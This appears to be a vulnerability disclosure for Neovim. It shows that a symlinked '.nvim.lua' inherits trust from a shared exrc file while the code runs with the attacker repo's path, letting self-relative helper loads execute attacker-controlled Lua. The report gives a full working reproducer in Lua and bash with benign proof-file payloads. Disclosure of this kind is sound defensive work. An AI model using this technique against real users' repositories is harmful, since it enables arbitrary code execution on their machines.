# Symlinked `.nvim.lua` can redirect trusted Lua exrc relative loads into the attacker repo

## Broken invariant

`'exrc'` trust is documented and implemented in terms of the real file that is allowed to run. For a trusted Lua exrc, the runtime script identity therefore needs to stay bound to that same canonical path.

Neovim breaks that invariant for `.nvim.lua`:

- `vim.fs.find()` discovers a project-local `.nvim.lua` as a normalized path string without resolving symlinks.
- `vim.secure.read(file)` then resolves that string to `fs_realpath(...)`, checks trust on the canonical target path, and returns the trusted target's bytes.
- `runtime/lua/vim/_core/exrc.lua` finally executes those trusted bytes as `loadstring(trusted, '@' .. file)()`, using the pre-`realpath` alias path as the Lua chunk name.

That means a repository can present a symlinked `.nvim.lua` that borrows trust from a previously trusted shared exrc file, while making that trusted code believe it is running from the attacker-controlled repository path.

Because Neovim's own docs explicitly recommend `debug.getinfo()` for a Lua exrc to locate itself, that alias-path drift is exploitable: any trusted Lua exrc that resolves helpers relative to its own source path can be steered into attacker-controlled sibling files.

## Input -> normalization -> policy gate -> sink

1. **Input:** an attacker repository provides:
   - `.nvim.lua` as a symlink to an already-trusted shared Lua exrc
   - attacker-controlled helper files next to the symlink
2. **Normalization:** `vim.fs.find()` starts from `uv.cwd()`, walks upward, and stores `M.normalize(match)` for matches; it does not `realpath()` the discovered `.nvim.lua`.
   - `/home/node/workspace/neovim/runtime/lua/vim/fs.lua:310-318`
   - `/home/node/workspace/neovim/runtime/lua/vim/fs.lua:337-367`
   - `/home/node/workspace/neovim/runtime/lua/vim/fs.lua:644-711`
3. **Policy gate:** `vim.secure.read(file)` canonicalizes the discovered path with `vim.uv.fs_realpath(vim.fs.normalize(path))`, hashes the canonical target, and looks it up in the trust DB under that canonical path.
   - `/home/node/workspace/neovim/runtime/lua/vim/secure.lua:107-128`
   - `/home/node/workspace/neovim/runtime/lua/vim/secure.lua:205-238`
4. **Sink:** if trusted, `.nvim.lua` is executed as `assert(loadstring(trusted, '@' .. file))()`.
   - `/home/node/workspace/neovim/runtime/lua/vim/_core/exrc.lua:8-12`
5. **Exploit consequence:** Lua treats that `@...` chunk name as script identity for debug info, and Neovim documents `debug.getinfo()` as the supported way for a Lua exrc to find its own location.
   - `/home/node/workspace/neovim/runtime/doc/options.txt:2636-2637`
   - `/home/node/workspace/neovim/runtime/doc/lua.txt:237-239`
   - `/home/node/workspace/neovim/runtime/doc/luaref.txt:3629-3630`
6. A trusted exrc that does a common self-relative helper load such as `loadfile(dir .. '/local.lua')()` will therefore resolve `dir` under the attacker repo, not under the canonical trusted file's directory.

## Minimal reproducer

This repro uses an explicitly trusted shared `.nvim.lua` and an attacker repo that symlinks to it. The shared file uses the documented `debug.getinfo()` self-location pattern to load a sibling helper.

### File contents

`/tmp/nvim-exrc-loader-final/trusted/.nvim.lua`

```lua
local self = debug.getinfo(1, 'S').source:gsub('^@', '')
local log = assert(io.open('/tmp/nvim-exrc-loader-final/observed-source.txt', 'w'))
log:write(self .. '\n')
log:close()
local dir = self:match('^(.+)/[^/]+$')
assert(loadfile(dir .. '/local.lua'))()
```

`/tmp/nvim-exrc-loader-final/trusted/local.lua`

```lua
local f = assert(io.open('/tmp/nvim-exrc-loader-final/trusted-proof', 'w'))
f:write('trusted\n')
f:close()
```

`/tmp/nvim-exrc-loader-final/attacker/local.lua`

```lua
local f = assert(io.open('/tmp/nvim-exrc-loader-final/attacker-proof', 'w'))
f:write('attacker\n')
f:close()
```

`/tmp/nvim-exrc-loader-final/attacker/.nvim.lua`

```text
symlink -> /tmp/nvim-exrc-loader-final/trusted/.nvim.lua
```

### Commands

```bash
set -euo pipefail
ROOT=/tmp/nvim-exrc-loader-final
rm -rf "$ROOT"
mkdir -p "$ROOT/home/.config" "$ROOT/home/.local/share" "$ROOT/state" "$ROOT/trusted" "$ROOT/attacker"

cat >"$ROOT/trusted/.nvim.lua" <<'EOF'
local self = debug.getinfo(1, 'S').source:gsub('^@', '')
local log = assert(io.open('/tmp/nvim-exrc-loader-final/observed-source.txt', 'w'))
log:write(self .. '\n')
log:close()
local dir = self:match('^(.+)/[^/]+$')
assert(loadfile(dir .. '/local.lua'))()
EOF

cat >"$ROOT/trusted/local.lua" <<'EOF'
local f = assert(io.open('/tmp/nvim-exrc-loader-final/trusted-proof', 'w'))
f:write('trusted\n')
f:close()
EOF

cat >"$ROOT/attacker/local.lua" <<'EOF'
local f = assert(io.open('/tmp/nvim-exrc-loader-final/attacker-proof', 'w'))
f:write('attacker\n')
f:close()
EOF

ln -s "$ROOT/trusted/.nvim.lua" "$ROOT/attacker/.nvim.lua"

export HOME="$ROOT/home"
export XDG_CONFIG_HOME="$ROOT/home/.config"
export XDG_DATA_HOME="$ROOT/home/.local/share"
export XDG_STATE_HOME="$ROOT/state"

nvim --headless \
  "+lua local ok,msg=vim.secure.trust{ action='allow', path='$ROOT/trusted/.nvim.lua' }; assert(ok, msg)" \
  "+qa!"

rm -f "$ROOT/trusted-proof" "$ROOT/attacker-proof" "$ROOT/observed-source.txt"

(
  cd "$ROOT/attacker"
  HOME="$ROOT/home" \
  XDG_CONFIG_HOME="$ROOT/home/.config" \
  XDG_DATA_HOME="$ROOT/home/.local/share" \
  XDG_STATE_HOME="$ROOT/state" \
  nvim --headless --cmd 'set exrc' +qa!
)

printf 'trust-db: '
cat "$ROOT/state/nvim/trust"
printf 'observed-source: '
cat "$ROOT/observed-source.txt"
printf 'attacker-proof: '
cat "$ROOT/attacker-proof"
```

### Expected vs actual

- **Expected:** once `/tmp/nvim-exrc-loader-final/trusted/.nvim.lua` is the trusted file, that canonical file identity should be the identity seen by the running chunk. A self-relative load should therefore stay under `/tmp/nvim-exrc-loader-final/trusted/`, or Neovim should reject symlink aliases entirely.
- **Actual:** the trust DB contains only the canonical trusted path, but the running Lua chunk reports the attacker alias path and the helper load resolves inside the attacker repo:

```text
trust-db: 5080950e57f9943cd4bcfaf0b493ae15ea6dcf44ed4e8b9bb42354ee759f17a0 /tmp/nvim-exrc-loader-final/trusted/.nvim.lua
observed-source: /tmp/nvim-exrc-loader-final/attacker/.nvim.lua
attacker-proof: attacker
```

That is, the trusted bytes from `/tmp/nvim-exrc-loader-final/trusted/.nvim.lua` ran with source identity `/tmp/nvim-exrc-loader-final/attacker/.nvim.lua`, and the follow-on `loadfile(dir .. '/local.lua')()` executed attacker-controlled Lua.

## Affected files

- `/home/node/workspace/neovim/src/nvim/main.c:2206-2239`
  - startup enters `vim._core.exrc` for project-local exrc loading.
- `/home/node/workspace/neovim/runtime/lua/vim/_core/exrc.lua:3-12`
  - collects discovered exrc candidates and executes trusted Lua with `loadstring(trusted, '@' .. file)()`.
- `/home/node/workspace/neovim/runtime/lua/vim/secure.lua:107-128`
  - `vim.secure.read()` canonicalizes with `fs_realpath()`, hashes the canonical target, and returns those bytes if trusted.
- `/home/node/workspace/neovim/runtime/lua/vim/secure.lua:205-238`
  - `vim.secure.trust()` stores trust entries under the canonical `fullpath`, not under the alias path.
- `/home/node/workspace/neovim/runtime/lua/vim/fs.lua:310-318`
  - search begins from `uv.cwd()` and stores normalized match strings.
- `/home/node/workspace/neovim/runtime/lua/vim/fs.lua:337-367`
  - upward search tests per-directory candidates and appends them in order.
- `/home/node/workspace/neovim/runtime/lua/vim/fs.lua:644-711`
  - `M.normalize()` collapses path syntax but does not resolve symlinks.
- `/home/node/workspace/neovim/runtime/doc/options.txt:2628-2637`
  - user-facing contract for trust-gated exrc execution, plus explicit guidance that a Lua exrc can locate itself with `debug.getinfo()`.
- `/home/node/workspace/neovim/runtime/doc/lua.txt:237-239`
  - documents the `debug.getinfo()` self-location idiom.
- `/home/node/workspace/neovim/runtime/doc/luaref.txt:3629-3630`
  - confirms that `chunkname` drives debug information.

## Impact / severity

This is a **moderate-severity trust-boundary break** in the Lua exrc path.

- **What breaks:** trust attaches to the canonical file, but runtime identity attaches to an attacker-controlled alias path.
- **Why it matters:** the docs explicitly steer Lua exrc authors toward `debug.getinfo()` to find their own directory. That turns the alias-path mismatch into a realistic confused-deputy primitive for self-relative helper loads.
- **Practical exploit shape:** a victim with `'exrc'` enabled and a previously trusted shared Lua exrc can be attacked by any repository that symlinks `.nvim.lua` to that trusted file and places malicious helpers next to the symlink.
- **Result:** attacker-controlled Lua executes during startup even though the only trusted path in the trust DB is the benign shared file.

This is not as strong as a default-on, no-preconditions RCE:

- `'exrc'` is off by default;
- the victim must already trust a Lua exrc file;
- the trusted file must use its own source path for follow-on behavior.

But within the `'exrc'` security model, the bug is still real and important: Neovim promises that trusted project-local code is tied to trusted paths, and the current Lua loader lets an untrusted repository rewrite that trusted code's apparent location.
